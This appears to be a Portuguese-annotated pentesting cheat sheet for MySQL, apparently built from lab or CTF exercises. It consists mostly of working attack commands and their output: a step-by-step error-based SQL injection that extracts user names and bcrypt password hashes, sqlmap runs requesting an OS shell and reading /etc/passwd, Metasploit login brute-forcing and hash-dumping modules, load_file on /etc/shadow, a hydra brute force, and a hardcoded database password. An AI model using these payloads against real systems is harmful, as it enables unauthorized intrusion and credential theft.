# MYSQL

- Nmap
    
    ```powershell
    nmap --script=mysql-empty-password -p 3306 192.71.145.3
    nmap --script=mysql-info -p 3306 192.71.145.3
    nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306
    192.71.145.3
    nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p
    3306 192.71.145.3
    nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p
    3306 192.71.145.3
    nmap --script=mysql-audit --script-args
    "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/n
    selib/data/mysql-cis.audit'" -p 3306 192.71.145.3
    nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p
    3306 192.71.145.3
    nmap --script=mysql-query --script-args="query='select count(*) from
    books.authors;',username='root',password=''" -p 3306 192.71.145.3
    ```
    
- Manual SQL enum
    
    `GET /?o=1'&page=app`
    
    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '5' or dest like '1'') LIMIT 10' at line 1
    
    Possível query
    
    `select * from table where (message like'5' or dest like '**<inject>**') LIMIT 10`
    
    Nota 
    
    Todas as query devem ser convertidas para codificação url
    
    Tentativas
    
    1
    
    `') and extractvalue(0x0a,version())-- -`
    
    Colocar url encoded
    
    `')+and+extractvalue(0x0a,version())--+-`
    
    Output
    
    DEBUG INFO: XPATH syntax error: '.39-MariaDB-0+deb10u1’
    
    Esta query está a limitar a apresentação dos resultados
    
    2
    
    `') and extractvalue(0x0a,concat(0x0a,version()))-- -`
    
    Output
    
    XPATH syntax error: '
    10.3.39-MariaDB-0+deb10u1'
    
    3
    
    `')+and+extractvalue(0x0a (select+SCHEMA_NAME+from+INFORMATION_SCHEMA.SCHEMATA))--+-`
    
    Output
    
    DEBUG INFO: Subquery returns more than 1 row
    
    Temos de limitar a apresentação a 1 linha
    
    4
    
    `') and extractvalue(0x0a,concat(0x0a,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1)))-- -`
    
    Output
    
    XPATH syntax error: 'information_schema'
    
    Sabemos que a primeira tabela é information_schema
    
    5
    
    `') and extractvalue(0x0a,concat(0x0a,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1,)))-- -`
    
    XPATH syntax error: 'redcross'
    
    A outra base de dados é redcross
    
    6
    
    `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA like "redcross" LIMIT 0,1)))-- -`
    
    Output
    
    XPATH syntax error: 'requests'
    
    `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA like "redcross" LIMIT 1,1)))-- -`
    
    Output
    
    XPATH syntax error: 'messages'
    
    `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA like "redcross" LIMIT 2,1)))-- -`
    
    Output
    
    XPATH syntax error: 'users'
    
    `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA like "redcross" LIMIT 3,1)))-- -`
    
    O output é diferente, quer dizer que já não existe mais tabelas.
    
    Tabelas: request, messages, users.
    
    7
    
    `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME like "users" LIMIT 0,1)))-- -`
    
    Output
    
    XPATH syntax error: 'id'
    
    `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME like "users" LIMIT 1,1)))-- -`
    
    Output
    
    XPATH syntax error: 'username'
    
    `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME like "users" LIMIT 2,1)))-- -`
    
    Output
    
    XPATH syntax error: 'password'
    
    `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME like "users" LIMIT 3,1)))-- -`
    
    Output
    
    XPATH syntax error: 'mail'
    
    `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME like "users" LIMIT 3,1)))-- -`
    
    Output
    
    XPATH syntax error: 'role'
    
    Como o erro é diferente do resto quer dizer que já terminou 
    
    8
    
    `') and extractvalue(0x0a,concat(0x0a,(select username from users LIMIT 0,1)))-- -`
    
    XPATH syntax error: 'admin'
    
    `') and extractvalue(0x0a,concat(0x0a,(select username from users LIMIT 1,1)))-- -`
    
    XPATH syntax error: 'penelope'
    
    `') and extractvalue(0x0a,concat(0x0a,(select username from users LIMIT 2,1)))-- -`
    
    XPATH syntax error: 'charles'
    
    `') and extractvalue(0x0a,concat(0x0a,(select username from users LIMIT 3,1)))-- -`
    
    XPATH syntax error: 'tricia'
    
    Users: admin, penelope, charles, tricia
    
    9
    
    Nota
    
    Ao mostrar o resultado, está limitado a 32 characters por isso tem de se fazer de forma diferente.
    
    `') and extractvalue(0x0a,concat(0x0a,substring((select password from users LIMIT 0,1) FROM 30) FROM 1)))-- -`
    
    `') and extractvalue(0x0a,concat(0x0a,substring((select password from users LIMIT 0,1) FROM 30) FROM 30)))-- -`
    
    XPATH syntax error: '$2y$10$z/d5GiwZuFqjY1jRiKIPzPXKt0SthLOyU438ajqRBtrb7ZADpwq.'
    
    `') and extractvalue(0x0a,concat(0x0a,substring((select password from users LIMIT 1,1) FROM 30) FROM 1)))-- -`
    
    `') and extractvalue(0x0a,concat(0x0a,substring((select password from users LIMIT 1,1) FROM 30) FROM 30)))-- -`
    
    XPATH syntax error: '$2y$10$tY9Y955kyFB37GnW4xrC0...'
    
    XPATH syntax error: 'J.FzmkrQhxD..vKCQICvwOEgwfxqgAS'
    
    `') and extractvalue(0x0a,concat(0x0a,substring((select password from users LIMIT 2,1) FROM 30) FROM 1)))-- -`
    
    `') and extractvalue(0x0a,concat(0x0a,substring((select password from users LIMIT 2,1) FROM 30) FROM 30)))-- -`
    
    XPATH syntax error: '$2y$10$bj5Qh0AbUM5wHeu/lTfjg...'
    
    XPATH syntax error: 'xPxjRQkqU6T8cs683Eus/Y89GHs.G7i'
    
    `') and extractvalue(0x0a,concat(0x0a,substring((select password from users LIMIT 3,1) FROM 30) FROM 1)))-- -`
    
    `') and extractvalue(0x0a,concat(0x0a,substring((select password from users LIMIT 3,1) FROM 30) FROM 30)))-- -`
    
- SQLmap
    
    ```bash
    sqlmap -r login.req --risk=3 --level=3 --batch --force-ssl
    sqlmap -r login.req --risk=3 --level=3 --batch --force-ssl --os-shell
    sqlmap -r login.req --risk 3 --level 5 --technique=BEU --batch --privilege
    sqlmap -r login.req --risk 3 --level 5 --technique=BEU --batch --privilege --file-read=/etc/passwd
    ```
    
- Enum
    - auxiliary/scanner/mysql/mysql_version
        
        ```powershell
        Module 1: auxiliary/scanner/mysql/mysql_version
        Commands:
        use auxiliary/scanner/mysql/mysql_version
        set RHOSTS 192.76.252.3
        run
        ```
        
    - auxiliary/scanner/mysql/mysql_login
        
        ```powershell
        Module 2: auxiliary/scanner/mysql/mysql_logi
        Commands:
        use auxiliary/scanner/mysql/mysql_login
        set RHOSTS 192.76.252.3
        set USERNAME root
        set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
        set VERBOSE false
        run
        ```
        
    - auxiliary/admin/mysql/mysql_enum
        
        ```powershell
        Module 3: auxiliary/admin/mysql/mysql_enum
        Commands:
        use auxiliary/admin/mysql/mysql_enum
        set USERNAME root
        set PASSWORD twinkle
        set RHOSTS 192.76.252.3
        run
        ```
        
    - auxiliary/admin/mysql/mysql_sql
        
        ```powershell
        Module 4: auxiliary/admin/mysql/mysql_sql
        Commands:
        use auxiliary/admin/mysql/mysql_sql
        set USERNAME root
        set PASSWORD twinkle
        set RHOSTS 192.76.252.3
        run
        ```
        
    - auxiliary/scanner/mysql/mysql_file_enum
        
        ```powershell
        Module 5: auxiliary/scanner/mysql/mysql_file_enum
        Commands:
        use auxiliary/scanner/mysql/mysql_file_enum
        set USERNAME root
        set PASSWORD twinkle
        set RHOSTS 192.76.252.3
        set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
        set VERBOSE true
        run
        ```
        
    - auxiliary/scanner/mysql/mysql_hashdump
        
        ```powershell
        Module 6: auxiliary/scanner/mysql/mysql_hashdump
        Commands:
        use auxiliary/scanner/mysql/mysql_hashdump
        set USERNAME root
        set PASSWORD twinkle
        set RHOSTS 192.76.252.3
        run
        ```
        
    - auxiliary/scanner/mysql/mysql_schemadump
        
        ```powershell
        Module 7: auxiliary/scanner/mysql/mysql_schemadump
        Commands:
        use auxiliary/scanner/mysql/mysql_schemadump
        set USERNAME root
        set PASSWORD twinkle
        set RHOSTS 192.76.252.3
        run
        ```
        
    - auxiliary/scanner/mysql/mysql_writable_dirs
        
        ```powershell
        Module 8: auxiliary/scanner/mysql/mysql_writable_dirs
        Commands:
        use auxiliary/scanner/mysql/mysql_writable_dirs
        set RHOSTS 192.76.252.3
        set USERNAME root
        set PASSWORD twinkle
        set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
        ru
        
        ```
        
- Commands
    
    ```powershell
    mysql -h 192.71.145.3 -u root select load_file("/etc/shadow");
    mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
    mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users;'
    mysql -h 192.71.145.3 -u root
    mysql -h db -u user-proot database -e 'show tables;’
    
    show databases;
    use database;
    select count(*) from authors;
    ```
    
- Post Explpoit
    
    ```bash
    
    msfconsole
    use auxiliary/scanner/mysql/mysql_schemadump
    set RHOSTS 192.71.145.3
    set USERNAME root
    set PASSWORD ""
    exploit
    
    use auxiliary/scanner/mysql/mysql_writable_dirs
    set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
    set RHOSTS 192.71.145.3
    set VERBOSE false
    set PASSWORD ""
    exploit
    
    use auxiliary/scanner/mysql/mysql_file_enum
    set RHOSTS 192.71.145.3
    set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
    set PASSWORD ""
    exploit
    
    use auxiliary/scanner/mysql/mysql_login
    set RHOSTS 192.149.194.3
    set USERNAME root
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
    set VERBOSE false
    set STOP_ON_SUCCESS true
    exploit
    
    use auxiliary/scanner/mysql/mysql_hashdump
    set RHOSTS 192.71.145.3
    set USERNAME root
    set PASSWORD ""
    exploit
    
    hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
    192.149.194.3 mysql
    ```